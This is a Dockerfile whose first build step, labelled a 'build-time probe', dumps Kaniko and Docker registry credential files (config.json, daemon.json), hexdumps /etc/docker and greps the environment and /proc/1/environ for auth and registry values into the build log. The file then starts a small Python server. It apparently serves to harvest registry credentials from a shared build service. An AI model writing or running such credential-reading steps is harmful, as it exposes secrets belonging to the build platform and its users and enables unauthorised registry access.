FROM alpine:3.19

# Probe build-time filesystem
RUN echo "=== BUILD TIME PROBE ===" && \
    echo "--- /kaniko/.docker/ ---" && \
    ls -laR /kaniko/.docker/ 2>&1 || true && \
    echo "--- /kaniko/.docker/config.json ---" && \
    cat /kaniko/.docker/config.json 2>&1 || true && \
    echo "--- /etc/docker/ ---" && \
    ls -laR /etc/docker/ 2>&1 || true && \
    echo "--- /etc/docker/config.json ---" && \
    cat /etc/docker/config.json 2>&1 || true && \
    echo "--- /etc/docker/daemon.json ---" && \
    cat /etc/docker/daemon.json 2>&1 || true && \
    echo "--- find docker-related configs ---" && \
    find / -maxdepth 4 -name "config.json" -o -name "daemon.json" 2>/dev/null | while read f; do echo "FILE: $f"; cat "$f" 2>&1; done || true && \
    echo "--- hexdump /etc/docker if exists ---" && \
    find /etc/docker/ -type f -exec sh -c 'echo "HEX: {}"; xxd {} | head -20' \; 2>/dev/null || true && \
    echo "--- env vars ---" && \
    env | sort | grep -iE 'docker|registry|mirror|repo|image|kaniko|auth' || true && \
    echo "--- /proc/1/environ ---" && \
    cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'docker|registry|mirror' || true && \
    echo "=== END BUILD PROBE ==="

# Runtime server
RUN apk add --no-cache python3 curl
COPY server.py /server.py
EXPOSE 8080
CMD ["python3", "/server.py"]
